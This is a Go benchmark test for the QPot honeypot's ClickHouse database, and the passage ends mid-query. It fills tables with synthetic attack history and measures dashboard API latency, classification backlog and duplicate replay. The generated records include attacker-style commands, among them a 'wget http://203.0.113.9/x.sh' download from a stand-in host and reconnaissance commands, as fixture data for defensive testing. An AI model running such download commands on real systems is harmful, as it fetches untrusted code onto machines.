//go:build unix

package soak

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"

	"github.com/ClickHouse/clickhouse-go/v2"
)

// The database benchmark: how a real instance behaves as its events table
// grows, with everything that normally touches the database running at once.
//
// It creates an instance as the soak does (real containers, the database
// under QPot's own limits and configuration), keeps real traffic coming
// through Cowrie, and then, for each size named in QPOT_BENCH_SIZES:
//
//   - fills the events table to that many rows with classified history spread
//     over the last 60 days, and the indicator and session tables in
//     proportion;
//   - for QPOT_BENCH_STAGE, lets QPOT_BENCH_BROWSERS dashboards poll what the
//     dashboard polls, every ten seconds, while the collector stores the live
//     traffic and the intelligence worker classifies it;
//   - records what each API call took, how far the worker fell behind, what
//     the database used, the queries that cost most and any it refused;
//   - then measures the worker at its limit: QPOT_BENCH_BACKLOG new events
//     (30,000 by default) stored at once, and how fast they are classified;
//   - and what a collector that lost its place costs: QPOT_BENCH_REPLAYS
//     classified events of the history (200,000 by default) sent again with
//     the IDs they have, and how long until no second copy is left.
//
// QPOT_SOAK=1 QPOT_BENCH=1 QPOT_SOAK_BIN=/tmp/qpot QPOT_SOAK_RATE=5 \
//     QPOT_BENCH_SIZES=1000000,5000000,10000000 QPOT_BENCH_STAGE=8m \
//     go test ./internal/soak -run TestDatabaseBench -timeout 0 -v
//
// It fails when the live traffic is not stored exactly once, when the
// instance is not healthy at the end of a stage, or when the database
// refused a query for lack of memory. Everything else is measurement.

// benchEndpoints is what one open dashboard asks for every ten seconds
// (refreshDashboard and loadIntelSummary in the web UI).
var benchEndpoints = []string{
	"/api/status", "/api/stats", "/api/honeypots", "/api/events?limit=50",
	"/api/intelligence", "/api/techniques", "/api/iocs?limit=15", "/api/ttps?limit=50",
}

const (
	benchPollEvery   = 10 * time.Second
	benchHistoryDays = 60
	// benchFillChunk is how many history rows one INSERT ... SELECT adds: a
	// few blocks at a time, as a collector that catches up would send them.
	benchFillChunk = 250_000
	// benchPhaseMost bounds each of the backlog and replay measurements.
	benchPhaseMost = 90 * time.Minute
	// benchIDHalves and benchObservationID make a version 8 UUID, the kind
	// of ID the collector gives an event, from a row number and a seed.
	benchIDHalves      = `lower(leftPad(hex(cityHash64(number, ?, 20)), 16, '0')) AS h1, lower(leftPad(hex(cityHash64(number, ?, 21)), 16, '0')) AS h2`
	benchObservationID = `toUUID(concat(substring(h1, 1, 8), '-', substring(h1, 9, 4), '-8', substring(h1, 14, 3), '-8', substring(h2, 2, 3), '-', substring(h2, 5, 12)))`
)

// benchCall is what one endpoint cost over a stage.
type benchCall struct {
	Path     string  `json:"path"`
	Calls    int     `json:"calls"`
	Failed   int     `json:"failed"`
	P50Ms    float64 `json:"p50_ms"`
	P95Ms    float64 `json:"p95_ms"`
	MaxMs    float64 `json:"max_ms"`
	AvgBytes int64   `json:"avg_bytes"`
	// FirstError is the first failure's text, when there was one.
	FirstError string `json:"first_error,omitempty"`
}

// benchQuery is one kind of query in the database's own log.
type benchQuery struct {
	Query    string  `json:"query"`
	Count    uint64  `json:"count"`
	TotalMs  uint64  `json:"total_ms"`
	AvgMs    float64 `json:"avg_ms"`
	MaxMs    uint64  `json:"max_ms"`
	AvgRows  uint64  `json:"avg_read_rows"`
	MaxMemMB float64 `json:"max_memory_mb"`
}

// benchStage is one table size.
type benchStage struct {
	Rows            uint64  `json:"events"`
	Indicators      uint64  `json:"indicators"`
	Sessions        uint64  `json:"sessions"`
	FillSeconds     float64 `json:"fill_seconds"`
	FillRowsPerSec  float64 `json:"fill_rows_per_second"`
	TableMB         float64 `json:"events_table_mb"`
	Started         time.Time
	Seconds         float64     `json:"measured_seconds"`
	API             []benchCall `json:"api"`
	LiveAccepted    int         `json:"live_connections_accepted"`
	LiveLost        int         `json:"live_connections_lost"`
	LiveTwice       int         `json:"live_connections_stored_twice"`
	DelayP50        float64     `json:"collection_delay_p50_s"`
	DelayMax        float64     `json:"collection_delay_max_s"`
	MaxUnclassified uint64      `json:"max_unclassified_events"`
	// ClassifyLagMax is the longest the oldest unclassified event of the
	// last hour had waited at any sample.
	ClassifyLagMax   float64      `json:"classification_lag_max_s"`
	MemoryMaxMB      float64      `json:"database_memory_max_mb"`
	PartsMax         uint64       `json:"events_parts_max"`
	MemoryRefusals   uint64       `json:"memory_refusals"`
	OtherExceptions  uint64       `json:"other_query_exceptions"`
	CPUThrottledPct  float64      `json:"database_cpu_throttled_percent"`
	Queries          []benchQuery `json:"costliest_queries"`
	Healthy          bool         `json:"healthy_at_end"`
	HealthNote       string       `json:"health_note,omitempty"`
	MutationsWaiting uint64       `json:"mutations_unfinished_max"`
	Backlog          benchBacklog `json:"backlog"`
	Replay           benchReplay  `json:"replay"`
}

// benchBacklog is the worker at its limit: Events stored at once, the
// seconds until the first of them was classified (the worker waits for its
// next pass) and from then until the last, and the rate in between.
type benchBacklog struct {
	Events        uint64  `json:"events"`
	StartSeconds  float64 `json:"seconds_to_first_classified"`
	DrainSeconds  float64 `json:"seconds_first_to_last"`
	PerSecond     float64 `json:"classified_per_second"`
	LeftAtTimeout uint64  `json:"left_unclassified_at_timeout"`
}

// benchReplay is a collector that lost its place: Copies rows of classified
// history stored again with their IDs, the seconds until the first copy was
// removed and until the last, and what was found at the end.
type benchReplay struct {
	Copies          uint64  `json:"copies"`
	FirstSeconds    float64 `json:"seconds_to_first_removed"`
	ClearedSeconds  float64 `json:"seconds_to_all_removed"`
	LeftAtTimeout   uint64  `json:"copies_left_at_timeout"`
	OriginalsLeft   uint64  `json:"originals_left"`
	StoredTwiceLeft uint64  `json:"ids_stored_twice_at_end"`
}

type benchReport struct {
	Tag      string         `json:"tag"`
	Options  map[string]any `json:"options"`
	Stages   []benchStage   `json:"stages"`
	Finished time.Time      `json:"finished"`
}

func TestDatabaseBench(t *testing.T) {
	opt := loadOptions(t)
	if os.Getenv("QPOT_BENCH") != "1" {
		t.Skip("set QPOT_BENCH=1 (with QPOT_SOAK=1 and QPOT_SOAK_BIN) to run the database benchmark; see doc/reliability.md")
	}
	var sizes []uint64
	for _, f := range strings.Split(env("QPOT_BENCH_SIZES", "1000000"), ",") {
		n, err := strconv.ParseUint(strings.TrimSpace(f), 10, 64)
		if err != nil || n == 0 || n > 200_000_000 {
			t.Fatalf("QPOT_BENCH_SIZES: %q is not a row count up to 200 million", f)
		}
		sizes = append(sizes, n)
	}
	sort.Slice(sizes, func(i, j int) bool { return sizes[i] < sizes[j] })
	stageFor, err := time.ParseDuration(env("QPOT_BENCH_STAGE", "8m"))
	if err != nil || stageFor < time.Minute {
		t.Fatalf("QPOT_BENCH_STAGE: %q is not a duration of a minute or more", os.Getenv("QPOT_BENCH_STAGE"))
	}
	browsers, err := strconv.Atoi(env("QPOT_BENCH_BROWSERS", "2"))
	if err != nil || browsers < 1 || browsers > 50 {
		t.Fatalf("QPOT_BENCH_BROWSERS: %q is not a number from 1 to 50", os.Getenv("QPOT_BENCH_BROWSERS"))
	}
	backlog, err := strconv.ParseUint(env("QPOT_BENCH_BACKLOG", "30000"), 10, 64)
	if err != nil || backlog > 5_000_000 {
		t.Fatalf("QPOT_BENCH_BACKLOG: %q is not a number of events up to 5 million (0 skips it)", os.Getenv("QPOT_BENCH_BACKLOG"))
	}
	replays, err := strconv.ParseUint(env("QPOT_BENCH_REPLAYS", "200000"), 10, 64)
	if err != nil || replays > 5_000_000 {
		t.Fatalf("QPOT_BENCH_REPLAYS: %q is not a number of rows up to 5 million (0 skips it)", os.Getenv("QPOT_BENCH_REPLAYS"))
	}

	tag := make([]byte, 4)
	if _, err := rand.Read(tag); err != nil {
		t.Fatal(err)
	}
	h := &harness{t: t, opt: opt, tag: hex.EncodeToString(tag), childEnv: os.Environ()}
	ctx := t.Context()
	if err := os.MkdirAll(opt.reportDir, 0o755); err != nil {
		t.Fatal(err)
	}
	h.setup(ctx)
	if !opt.keep {
		t.Cleanup(func() {
			cctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
			defer cancel()
			_, _ = h.qpot(cctx, 5*time.Minute, "down", "-i", opt.instance)
			if pid := h.servePID(); pid != 0 {
				_ = syscall.Kill(pid, syscall.SIGKILL)
			}
			_, _ = h.qpot(cctx, 5*time.Minute, "instance", "remove", opt.instance)
		})
	}
	loadCtx, stopLoad := context.WithCancel(ctx)
	var loaders sync.WaitGroup
	loaders.Add(1)
	go func() { defer loaders.Done(); h.load(loadCtx, &loaders) }()
	h.logf("warm-up: 90s of traffic at %.1f connections/s", opt.rate)
	time.Sleep(90 * time.Second)
	if d, why := h.settle(ctx, time.Now().Add(-10*time.Second), 5*time.Minute, true); d < 0 {
		t.Fatalf("the instance does not keep up before any history is loaded: %s", why)
	}

	rep := benchReport{Tag: h.tag, Options: map[string]any{"rate_per_second": opt.rate, "stage": stageFor.String(),
		"browsers": browsers, "history_days": benchHistoryDays, "binary": filepath.Base(opt.bin),
		"backlog": backlog, "replays": replays}}
	if out, err := h.qpot(ctx, time.Minute, "--version"); err == nil {
		rep.Options["version"] = strings.TrimSpace(out)
	}
	for _, size := range sizes {
		st := h.benchStage(ctx, size, stageFor, browsers)
		rep.Stages = append(rep.Stages, st)
		h.benchWrite(rep)
		if backlog > 0 {
			st.Backlog = h.benchBacklog(ctx, backlog)
			rep.Stages[len(rep.Stages)-1] = st
			h.benchWrite(rep)
			if st.Backlog.LeftAtTimeout != 0 {
				t.Errorf("%d events: %d of a backlog of %d were still unclassified after %s", size, st.Backlog.LeftAtTimeout, backlog, benchPhaseMost)
			}
		}
		if replays > 0 {
			st.Replay = h.benchReplay(ctx, replays)
			rep.Stages[len(rep.Stages)-1] = st
			h.benchWrite(rep)
			if r := st.Replay; r.LeftAtTimeout != 0 || r.StoredTwiceLeft != 0 || r.OriginalsLeft != r.Copies {
				t.Errorf("%d events: after %d rows were sent again, %d copies were left at the timeout, %d IDs stored twice at the end, %d of %d originals left",
					size, r.Copies, r.LeftAtTimeout, r.StoredTwiceLeft, r.OriginalsLeft, r.Copies)
			}
		}
		if st.MemoryRefusals != 0 {
			t.Errorf("%d events: the database refused %d queries for lack of memory", size, st.MemoryRefusals)
		}
		if st.LiveLost != 0 || st.LiveTwice != 0 {
			t.Errorf("%d events: of %d live connections %d were lost and %d stored twice", size, st.LiveAccepted, st.LiveLost, st.LiveTwice)
		}
		if !st.Healthy {
			t.Errorf("%d events: the instance was not healthy at the end of the stage: %s", size, st.HealthNote)
		}
	}
	stopLoad()
	loaders.Wait()
	rep.Finished = time.Now()
	h.benchWrite(rep)
}

// one runs a query that returns a single number; 0 when it fails.
func (h *harness) one(ctx context.Context, timeout time.Duration, query string, args ...any) uint64 {
	qctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	var n uint64
	if err := h.db.QueryRow(qctx, query, args...).Scan(&n); err != nil {
		return 0
	}
	return n
}

// benchFill adds classified history until the events table holds rows rows,
// and indicators and sessions in proportion (one indicator per 40 events,
// one session per 100). Rows are generated in the database, in time order.
func (h *harness) benchFill(ctx context.Context, rows uint64) (added uint64, took time.Duration) {
	t := h.t
	have := h.one(ctx, 2*time.Minute, `SELECT count() FROM events`)
	start := time.Now()
	if have >= rows {
		return 0, 0
	}
	need := rows - have
	span := int64(benchHistoryDays) * 24 * 3600 * 1000
	end := time.Now().Add(-15 * time.Minute).UnixMilli()
	seed := time.Now().UnixNano()
	for done := uint64(0); done < need; {
		n := min(uint64(benchFillChunk), need-done)
		// This chunk covers its own slice of the 60 days, oldest first.
		from := end - span + int64(float64(span)*float64(done)/float64(need))
		width := max(int64(float64(span)*float64(n)/float64(need)), 1)
		// Each row has an ID of the collector's kind (version 8, see
		// database.IsObservationID) and the set of classified IDs holds it,
		// as if the worker had classified it, so that a copy of it sent
		// again is recognised as one. asn marks the history.
		err := h.benchRetry(ctx, func(qctx context.Context) error {
			return h.db.Exec(qctx, `DELETE FROM events WHERE asn = 'bench-history'
				AND timestamp >= fromUnixTimestamp64Milli(?) AND timestamp < fromUnixTimestamp64Milli(?)`, from, from+width)
		}, `INSERT INTO events (timestamp, honeypot, source_ip, source_port, dest_port, protocol, event_type,
				username, password, command, payload, metadata, country, asn, technique_id, technique_name, tactic_id, tactic_name,
				kill_chain_stage, confidence, classified, categories, event_id)
			SELECT fromUnixTimestamp64Milli(toInt64(? + intDiv(number * ?, ?))),
				['dionaea','conpot','heralding','honeytrap','ciscoasa','mailoney'][1 + cityHash64(number, ?, 3) % 6],
				IPv4NumToString(toUInt32(if(cityHash64(number, ?, 1) % 10 < 4, 754974720 + cityHash64(number, ?, 2) % 400, 16777216 + cityHash64(number, ?, 2) % 3000000000))),
				toUInt16(1024 + cityHash64(number, ?, 9) % 60000), [22, 23, 80, 445, 502, 3389][1 + cityHash64(number, ?, 10) % 6],
				'tcp', ['connection','login.failed','login.success','command.input','session.closed','file.download'][1 + cityHash64(number, ?, 4) % 6],
				['root','admin','user','test','oracle','ubuntu'][1 + cityHash64(number, ?, 5) % 6], concat('pw', toString(cityHash64(number, ?, 6) % 5000)),
				if(cityHash64(number, ?, 7) % 4 = 0, ['uname -a','cat /proc/cpuinfo','wget http://203.0.113.9/x.sh','id','ls -la /tmp'][1 + cityHash64(number, ?, 8) % 5], ''),
				if(cityHash64(number, ?, 11) % 3 = 0, randomPrintableASCII(200), ''),
				map('session', hex(cityHash64(number, ?, 12) % 2000000), 'version', 'SSH-2.0-libssh_0.9.6'),
				['CN','US','RU','DE','NL','BR','IN','VN','KR','FR'][1 + cityHash64(number, ?, 13) % 10], 'bench-history',
				['T1110','T1082','T1105','T1595',''][1 + cityHash64(number, ?, 14) % 5], 'Technique', 'TA0006', 'Credential Access',
				'exploitation', 0.8, 1, ['Brute force'], `+benchObservationID+`
			FROM (SELECT number, `+benchIDHalves+` FROM numbers(?)) SETTINGS max_insert_threads = 1, max_threads = 1, max_block_size = 65536`,
			from, width, n, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, n)
		if err != nil {
			t.Fatalf("fill the events table (%d of %d rows added): %v", done, need, err)
		}
		// Adding an ID twice changes nothing, so this is repeated as it is.
		err = h.benchRetry(ctx, nil, `INSERT INTO classified_event_ids (event_id) SELECT event_id FROM events
			WHERE timestamp >= fromUnixTimestamp64Milli(?) AND timestamp < fromUnixTimestamp64Milli(?) AND asn = 'bench-history'
			SETTINGS max_insert_threads = 1, max_threads = 1`, from, from+width)
		if err != nil {
			t.Fatalf("record the history's IDs as classified (%d of %d rows added): %v", done, need, err)
		}
		done += n
		seed++
	}
	fill := func(table, query string, want uint64) {
		have := h.one(ctx, time.Minute, `SELECT count() FROM `+table)
		if have >= want {
			return
		}
		qctx, cancel := context.WithTimeout(ctx, 10*time.Minute)
		defer cancel()
		if err := h.db.Exec(qctx, query, have, want-have); err != nil {
			t.Fatalf("fill %s: %v", table, err)
		}
	}
	fill("intelligence_iocs", `INSERT INTO intelligence_iocs (revision, id, type, value, honeypot, source_ip, technique_id, first_seen, last_seen, count, metadata)
		SELECT 1, hex(cityHash64(number, 21)), ['ip','credential','command','url'][1 + number % 4], concat('bench-', toString(number)), 'dionaea',
			IPv4NumToString(toUInt32(16777216 + cityHash64(number, 22) % 3000000000)), 'T1110',
			now64(3) - toIntervalDay(30), now64(3) - toIntervalSecond(number % 2592000), 1 + number % 50, map()
		FROM (SELECT number + ? AS number FROM numbers(?)) SETTINGS max_insert_threads = 1, max_threads = 1`, rows/40)
	fill("intelligence_sessions", `INSERT INTO intelligence_sessions (revision, session_id, campaign_fingerprint, source_ips, shared_infrastructure,
			kill_chain_stages, techniques, ioc_ids, event_count, first_seen, last_seen, confidence)
		SELECT 1, concat('bench-', toString(number)), hex(cityHash64(number % 5000, 23)), [IPv4NumToString(toUInt32(16777216 + cityHash64(number, 24) % 3000000000))], 0,
			['reconnaissance','exploitation'], ['T1110','T1082'], [hex(cityHash64(number, 21))], 1 + number % 200,
			now64(3) - toIntervalDay(20), now64(3) - toIntervalSecond(number % 1728000), 0.7
		FROM (SELECT number + ? AS number FROM numbers(?)) SETTINGS max_insert_threads = 1, max_threads = 1`, rows/100)
	return need, time.Since(start)
}

// benchRetry runs a statement of the fill, and when the database refuses it
// for lack of memory (its merges hold memory too) runs undo, waits, and
// tries again: a refused INSERT ... SELECT may have stored some of its
// blocks.
func (h *harness) benchRetry(ctx context.Context, undo func(context.Context) error, query string, args ...any) error {
	wait := 10 * time.Second
	for attempt := 1; ; attempt++ {
		qctx, cancel := context.WithTimeout(ctx, 10*time.Minute)
		err := h.db.Exec(qctx, query, args...)
		cancel()
		var ex *clickhouse.Exception
		if err == nil || !errors.As(err, &ex) || ex.Code != 241 || attempt == 6 {
			return err
		}
		h.logf("  the database refused a fill statement for lack of memory (attempt %d); trying again in %s", attempt, wait)
		time.Sleep(wait)
		if undo != nil {
			qctx, cancel := context.WithTimeout(ctx, 10*time.Minute)
			err := undo(qctx)
			cancel()
			if err != nil {
				return fmt.Errorf("undo a refused fill statement: %w", err)
			}
		}
		wait *= 2
	}
}

// count runs a count query, trying again for a minute when it fails, so a
// failed query is never read as zero rows.
func (h *harness) count(ctx context.Context, query string, args ...any) (uint64, error) {
	return h.countWithin(ctx, 30*time.Second, query, args...)
}

// countWithin is count for a query that may take up to limit: the
// connection's own limit (max_execution_time) is raised to match.
func (h *harness) countWithin(ctx context.Context, limit time.Duration, query string, args ...any) (uint64, error) {
	var err error
	ctx = clickhouse.Context(ctx, clickhouse.WithSettings(clickhouse.Settings{"max_execution_time": int(limit.Seconds())}))
	for deadline := time.Now().Add(time.Minute); ; time.Sleep(2 * time.Second) {
		qctx, cancel := context.WithTimeout(ctx, limit)
		var n uint64
		err = h.db.QueryRow(qctx, query, args...).Scan(&n)
		cancel()
		if err == nil {
			return n, nil
		}
		if time.Now().After(deadline) || ctx.Err() != nil {
			return 0, err
		}
	}
}

// benchBacklog stores n new events at once, unclassified, from 400
// addresses over the last 20 minutes, and measures how fast the worker
// classifies them: from the last look that found none of them classified to
// the first that found all, so the rate is never overstated.
func (h *harness) benchBacklog(ctx context.Context, n uint64) benchBacklog {
	t := h.t
	b := benchBacklog{Events: n}
	h.logf("  backlog: %d new events stored at once", n)
	seed := time.Now().UnixNano()
	qctx, cancel := context.WithTimeout(ctx, 10*time.Minute)
	err := h.db.Exec(qctx, `INSERT INTO events (timestamp, honeypot, source_ip, source_port, dest_port, protocol, event_type,
			username, password, command, payload, metadata, country, asn, event_id)
		SELECT now64(3) - toIntervalMillisecond(1200000 - intDiv(number * 1200000, ?)),
			['dionaea','conpot','heralding','honeytrap','ciscoasa','mailoney'][1 + cityHash64(number, ?, 3) % 6],
			IPv4NumToString(toUInt32(754974720 + cityHash64(number, ?, 2) % 400)),
			toUInt16(1024 + cityHash64(number, ?, 9) % 60000), [22, 23, 80, 445, 502, 3389][1 + cityHash64(number, ?, 10) % 6],
			'tcp', ['connection','login.failed','login.success','command.input','session.closed','file.download'][1 + cityHash64(number, ?, 4) % 6],
			['root','admin','user','test','oracle','ubuntu'][1 + cityHash64(number, ?, 5) % 6], concat('pw', toString(cityHash64(number, ?, 6) % 5000)),
			if(cityHash64(number, ?, 7) % 4 = 0, ['uname -a','cat /proc/cpuinfo','wget http://203.0.113.9/x.sh','id','ls -la /tmp'][1 + cityHash64(number, ?, 8) % 5], ''),
			if(cityHash64(number, ?, 11) % 3 = 0, randomPrintableASCII(200), ''),
			map('session', hex(cityHash64(number, ?, 12) % 2000000), 'version', 'SSH-2.0-libssh_0.9.6'),
			['CN','US','RU','DE','NL','BR','IN','VN','KR','FR'][1 + cityHash64(number, ?, 13) % 10], 'bench-backlog', `+benchObservationID+`
		FROM (SELECT number, `+benchIDHalves+` FROM numbers(?)) SETTINGS max_insert_threads = 1, max_threads = 1`,
		n, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, n)
	cancel()
	if err != nil {
		t.Fatalf("store the backlog: %v", err)
	}
	stored := time.Now()
	lastNone, first := stored, time.Time{}
	for {
		left, err := h.count(ctx, `SELECT count() FROM events WHERE classified = 0 AND asn = 'bench-backlog'`)
		if err != nil {
			t.Fatalf("count the backlog: %v", err)
		}
		now := time.Now()
		switch {
		case left >= n:
			lastNone = now
		case first.IsZero():
			first = now
			b.StartSeconds = now.Sub(stored).Seconds()
		}
		if left == 0 {
			b.DrainSeconds = now.Sub(lastNone).Seconds()
			b.PerSecond = float64(n) / b.DrainSeconds
			h.logf("  backlog: first classified after %.0fs, all %d within %.0fs of the worker starting: %.1f events/s",
				b.StartSeconds, n, b.DrainSeconds, b.PerSecond)
			return b
		}
		if now.Sub(stored) > benchPhaseMost {
			b.LeftAtTimeout = left
			h.logf("  backlog: %d of %d still unclassified after %s", left, n, benchPhaseMost)
			return b
		}
		time.Sleep(2 * time.Second)
	}
}

// benchReplay sends again, as a collector that lost its place does, about
// `copies` classified rows of the history: the same rows with the same IDs,
// unclassified. It measures how long until the first and the last copy are
// gone, and then checks that every original is still there, once.
func (h *harness) benchReplay(ctx context.Context, copies uint64) benchReplay {
	t := h.t
	var r benchReplay
	history, err := h.countWithin(ctx, 5*time.Minute, `SELECT count() FROM events WHERE asn = 'bench-history'`)
	if err != nil || history == 0 {
		t.Fatalf("count the history: %d rows, %v", history, err)
	}
	// A sample spread over all 60 days: every k-th ID.
	sample := fmt.Sprintf("asn = 'bench-history' AND cityHash64(event_id) %% %d = 0", max(history/copies, 1))
	originals, err := h.countWithin(ctx, 5*time.Minute, `SELECT count() FROM events WHERE `+sample)
	if err != nil {
		t.Fatalf("count the sample: %v", err)
	}
	qctx, cancel := context.WithTimeout(clickhouse.Context(ctx, clickhouse.WithSettings(clickhouse.Settings{"max_execution_time": 1200})), 20*time.Minute)
	err = h.db.Exec(qctx, `INSERT INTO events (timestamp, honeypot, source_ip, source_port, dest_port, protocol, event_type,
			username, password, command, payload, metadata, country, city, asn, event_id)
		SELECT timestamp, honeypot, source_ip, source_port, dest_port, protocol, event_type,
			username, password, command, payload, metadata, country, city, asn, event_id
		FROM events WHERE `+sample+` AND classified = 1
		SETTINGS max_insert_threads = 1, max_threads = 1, insert_deduplicate = 0`)
	cancel()
	if err != nil {
		t.Fatalf("send the sample again: %v", err)
	}
	sent := time.Now()
	// Every row of the sample was sent once more. (Counting them now would
	// miss those a worker already removed.)
	r.Copies = originals
	h.logf("  replay: %d rows of the history sent again (%d originals in the sample)", r.Copies, originals)
	for {
		left, err := h.count(ctx, `SELECT count() FROM events WHERE classified = 0 AND asn = 'bench-history'`)
		if err != nil {
			t.Fatalf("count the copies: %v", err)
		}
		since := time.Since(sent).Seconds()
		if left < r.Copies && r.FirstSeconds == 0 {
			r.FirstSeconds = since
		}
		if left == 0 {
			r.ClearedSeconds = since
			break
		}
		if time.Since(sent) > benchPhaseMost {
			r.LeftAtTimeout = left
			break
		}
		time.Sleep(5 * time.Second)
	}
	r.OriginalsLeft, err = h.countWithin(ctx, 5*time.Minute, `SELECT count() FROM events WHERE `+sample)
	if err != nil {
		t.Fatalf("count the sample: %v", err)
	}
	if r.OriginalsLeft != originals && r.LeftAtTimeout == 0 {
		h.logf("  replay: %d rows of the sample at the end, %d before", r.OriginalsLeft, originals)
	}
	twice, err := h.countWithin(ctx, 5*time.Minute, `SELECT toUInt64(count() - uniqExact(event_id)) FROM events WHERE `+sample+` SETTINGS max_threads = 1`)
	if err != nil {
		t.Fatalf("look for IDs stored twice: %v", err)
	}
	r.StoredTwiceLeft = twice
	h.logf("  replay: first copy removed after %.0fs, all after %.0fs (%d left at the timeout); %d IDs stored twice at the end",
		r.FirstSeconds, r.ClearedSeconds, r.LeftAtTimeout, twice)
	return r
}

// benchGet asks the control plane as the dashboard does and reads the whole
// answer.
func (h *harness) benchGet(ctx context.Context, path string) (took time.Duration, size int64, err error) {
	ctx, cancel := context.WithTimeout(ctx, 60*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, h.web+path, nil)
	if err != nil {
		return 0, 0, err
	}
	req.Header.Set("X-QPot-ID", h.qid)
	start := time.Now()
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return time.Since(start), 0, err
	}
	defer resp.Body.Close()
	n, rerr := io.Copy(io.Discard, resp.Body)
	took = time.Since(start)
	switch {
	case rerr != nil:
		return took, n, rerr
	case resp.StatusCode != http.StatusOK:
		return took, n, fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	return took, n, nil
}

func (h *harness) benchStage(ctx context.Context, rows uint64, stageFor time.Duration, browsers int) benchStage {
	h.logf("STAGE %d events: loading history", rows)
	added, took := h.benchFill(ctx, rows)
	st := benchStage{FillSeconds: took.Seconds()}
	if took > 0 {
		st.FillRowsPerSec = float64(added) / took.Seconds()
	}
	// Let the merges of the load finish, for at most three minutes: the
	// stage measures a table at rest plus live traffic, not the backfill.
	for wait := time.Now().Add(3 * time.Minute); time.Now().Before(wait); time.Sleep(5 * time.Second) {
		if h.one(ctx, 20*time.Second, `SELECT count() FROM system.merges WHERE table = 'events'`) == 0 {
			break
		}
	}
	st.Rows = h.one(ctx, 2*time.Minute, `SELECT count() FROM events`)
	st.Indicators = h.one(ctx, time.Minute, `SELECT count() FROM intelligence_iocs`)
	st.Sessions = h.one(ctx, time.Minute, `SELECT count() FROM intelligence_sessions`)
	st.TableMB = float64(h.one(ctx, time.Minute, `SELECT sum(bytes_on_disk) FROM system.parts WHERE active AND table = 'events' AND database = currentDatabase()`)) / (1 << 20)
	h.logf("  %d events (%.0f MB on disk), %d indicators, %d sessions; loaded %d rows in %s (%.0f rows/s)",
		st.Rows, st.TableMB, st.Indicators, st.Sessions, added, took.Round(time.Second), st.FillRowsPerSec)

	throttledBefore, periodsBefore := h.benchThrottle(ctx)
	st.Started = time.Now()
	stageCtx, stop := context.WithTimeout(ctx, stageFor)
	defer stop()
	var mu sync.Mutex
	type sample struct {
		ms    []float64
		bytes int64
		fail  int
		first string
	}
	calls := map[string]*sample{}
	for _, p := range benchEndpoints {
		calls[p] = &sample{}
	}
	var wg sync.WaitGroup
	for b := 0; b < browsers; b++ {
		wg.Add(1)
		go func(b int) {
			defer wg.Done()
			// Dashboards do not open at the same instant.
			select {
			case <-stageCtx.Done():
				return
			case <-time.After(time.Duration(b) * benchPollEvery / time.Duration(browsers)):
			}
			tick := time.NewTicker(benchPollEvery)
			defer tick.Stop()
			for {
				var round sync.WaitGroup
				for _, p := range benchEndpoints {
					round.Add(1)
					go func(p string) {
						defer round.Done()
						took, size, err := h.benchGet(ctx, p)
						mu.Lock()
						defer mu.Unlock()
						s := calls[p]
						s.ms = append(s.ms, float64(took.Microseconds())/1000)
						s.bytes += size
						if err != nil {
							s.fail++
							if s.first == "" {
								s.first = err.Error()
							}
						}
					}(p)
				}
				round.Wait()
				select {
				case <-stageCtx.Done():
					return
				case <-tick.C:
				}
			}
		}(b)
	}
	// The sampler: how far classification is behind and what the database
	// holds, every ten seconds. Its own queries are bounded to the last hour.
	wg.Add(1)
	go func() {
		defer wg.Done()
		tick := time.NewTicker(benchPollEvery)
		defer tick.Stop()
		for {
			select {
			case <-stageCtx.Done():
				return
			case <-tick.C:
			}
			st.MaxUnclassified = max(st.MaxUnclassified, h.one(ctx, 20*time.Second,
				`SELECT count() FROM events WHERE timestamp > now() - INTERVAL 1 HOUR AND classified = 0 AND honeypot != 'canary'`))
			lag := h.one(ctx, 20*time.Second, `SELECT toUInt64(greatest(0, dateDiff('second', min(timestamp), now())))
				FROM events WHERE timestamp > now() - INTERVAL 1 HOUR AND classified = 0 AND honeypot != 'canary' HAVING count() > 0`)
			st.ClassifyLagMax = max(st.ClassifyLagMax, float64(lag))
			st.MemoryMaxMB = max(st.MemoryMaxMB, float64(h.one(ctx, 20*time.Second,
				`SELECT toUInt64(value) FROM system.asynchronous_metrics WHERE metric = 'MemoryResident'`))/(1<<20))
			st.PartsMax = max(st.PartsMax, h.one(ctx, 20*time.Second,
				`SELECT count() FROM system.parts WHERE active AND table = 'events' AND database = currentDatabase()`))
			st.MutationsWaiting = max(st.MutationsWaiting, h.one(ctx, 20*time.Second,
				`SELECT count() FROM system.mutations WHERE is_done = 0 AND database = currentDatabase()`))
		}
	}()
	wg.Wait()
	st.Seconds = time.Since(st.Started).Seconds()

	for _, p := range benchEndpoints {
		s := calls[p]
		c := benchCall{Path: p, Calls: len(s.ms), Failed: s.fail, FirstError: s.first}
		if len(s.ms) > 0 {
			sort.Float64s(s.ms)
			c.P50Ms, c.P95Ms, c.MaxMs = s.ms[len(s.ms)/2], s.ms[len(s.ms)*95/100], s.ms[len(s.ms)-1]
			c.AvgBytes = s.bytes / int64(len(s.ms))
		}
		st.API = append(st.API, c)
	}

	// The live traffic of this stage, once the collector has caught up.
	h.settle(ctx, time.Now(), 5*time.Minute, true)
	acct := h.account(ctx, time.Now().Add(-10*time.Second))
	h.mu.Lock()
	for _, c := range h.conns {
		if c.Accepted && c.Sent.After(st.Started) && c.Sent.Before(acct.Ended) {
			st.LiveAccepted++
			if acct.lost[c.N] {
				st.LiveLost++
			}
			if acct.twice[c.N] {
				st.LiveTwice++
			}
		}
	}
	h.mu.Unlock()
	var delays []float64
	for _, d := range acct.delays {
		delays = append(delays, d)
	}
	if len(delays) > 0 {
		sort.Float64s(delays)
		st.DelayP50, st.DelayMax = delays[len(delays)/2], delays[len(delays)-1]
	}

	since := st.Started.UTC().Format("2006-01-02 15:04:05")
	_ = h.db.Exec(ctx, `SYSTEM FLUSH LOGS`)
	st.MemoryRefusals = h.one(ctx, time.Minute, `SELECT count() FROM system.query_log
